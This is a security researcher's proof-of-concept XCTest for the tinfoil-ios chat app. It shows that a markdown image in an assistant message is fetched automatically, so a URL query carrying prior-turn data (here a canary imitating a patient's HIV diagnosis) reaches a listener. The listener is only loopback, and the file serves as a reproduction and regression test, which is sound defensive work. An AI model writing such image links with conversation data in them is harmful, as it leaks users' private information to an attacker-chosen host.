// Finding 17: suggested hosted XCTest for tinfoil-ios @ cd5824e (NOT executed by the reporter:
// no iOS runtime was available). Add to the TinfoilChatTests target and run on an iOS Simulator:
//   xcodebuild test -project TinfoilChat.xcodeproj -scheme TinfoilChat \
//     -destination 'platform=iOS Simulator,name=iPhone 16' \
//     -only-testing:TinfoilChatTests/RemoteImageFetchTests
//
// It renders an assistant message with the app's own LaTeXMarkdownView (the view MessageView.swift:454
// uses for assistant text) in a real window, and records whether the image URL is requested from an
// in-process loopback listener. Nothing leaves the simulator.
//
// Expected at cd5824e (vulnerable): test 1 PASSES (the GET with the canary arrives with no interaction),
// test 2 PASSES (control). After the fix (a refusing imageAttachmentLoader), test 1 fails; then flip
// `hit.isInverted = true` to keep it as a regression test.
//
// The listener URL uses an IP literal over http:// for convenience: ATS does not apply to IP-address
// hosts. A real attacker uses https://any-host, which default ATS allows (the app has no ATS keys).
import Network
import SwiftUI
import XCTest
@testable import TinfoilChat

@MainActor
final class RemoteImageFetchTests: XCTestCase {
    private var listener: NWListener?
    private var window: UIWindow?
    private var requests: [String] = []

    override func tearDown() {
        listener?.cancel()
        window = nil
        super.tearDown()
    }

    /// Starts a loopback HTTP listener; every request line is appended to `requests` and fulfils `onRequest`.
    private func startListener(onRequest: XCTestExpectation) throws -> UInt16 {
        let params = NWParameters.tcp
        params.requiredLocalEndpoint = NWEndpoint.hostPort(host: "127.0.0.1", port: .any)
        let l = try NWListener(using: params)
        let ready = expectation(description: "listener ready")
        l.stateUpdateHandler = { if case .ready = $0 { ready.fulfill() } }
        l.newConnectionHandler = { [weak self] conn in
            conn.start(queue: .main)
            conn.receive(minimumIncompleteLength: 1, maximumLength: 65_536) { data, _, _, _ in
                let line = String(decoding: data ?? Data(), as: UTF8.self)
                    .components(separatedBy: "\r\n").first ?? ""
                MainActor.assumeIsolated { self?.requests.append(line) }
                print("[poc] listener got: \(line)")
                let resp = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                conn.send(content: Data(resp.utf8), completion: .contentProcessed { _ in conn.cancel() })
                onRequest.fulfill()
            }
        }
        l.start(queue: .main)
        wait(for: [ready], timeout: 5)
        listener = l
        return try XCTUnwrap(l.port?.rawValue)
    }

    /// Hosts the shipped assistant-message view in a key window so SwiftUI runs its `.task` modifiers.
    private func renderAssistant(_ markdown: String) {
        let view = LaTeXMarkdownView(content: markdown, isDarkMode: false, isStreaming: false)
            .frame(width: 390, height: 700)
        let w = UIWindow(frame: CGRect(x: 0, y: 0, width: 390, height: 844))
        w.rootViewController = UIHostingController(rootView: view)
        w.makeKeyAndVisible()
        window = w
    }

    /// Reproduction: a model-authored markdown image is fetched as soon as the message renders.
    func testAssistantMarkdownImageIsFetchedWithoutInteraction() throws {
        let hit = expectation(description: "image GET reached the attacker listener")
        hit.assertForOverFulfill = false
        let port = try startListener(onRequest: hit)
        let canary = "CANARY-prior-turn-Jane-Roe-dx-HIV-2023"
        renderAssistant("Here is your summary.\n\n![logo](http://127.0.0.1:\(port)/x.png?d=\(canary))")
        wait(for: [hit], timeout: 10)
        XCTAssertTrue(requests.contains { $0.hasPrefix("GET /x.png?d=\(canary)") }, "\(requests)")
    }

    /// Negative control: the same URL as an ordinary link (not image syntax) causes no request.
    func testHonestAnswerCausesNoRequest() throws {
        let hit = expectation(description: "no request expected")
        hit.isInverted = true
        let port = try startListener(onRequest: hit)
        renderAssistant("Here is your summary. [source](http://127.0.0.1:\(port)/x.png?d=CANARY)")
        wait(for: [hit], timeout: 5)
        XCTAssertTrue(requests.isEmpty)
    }
}
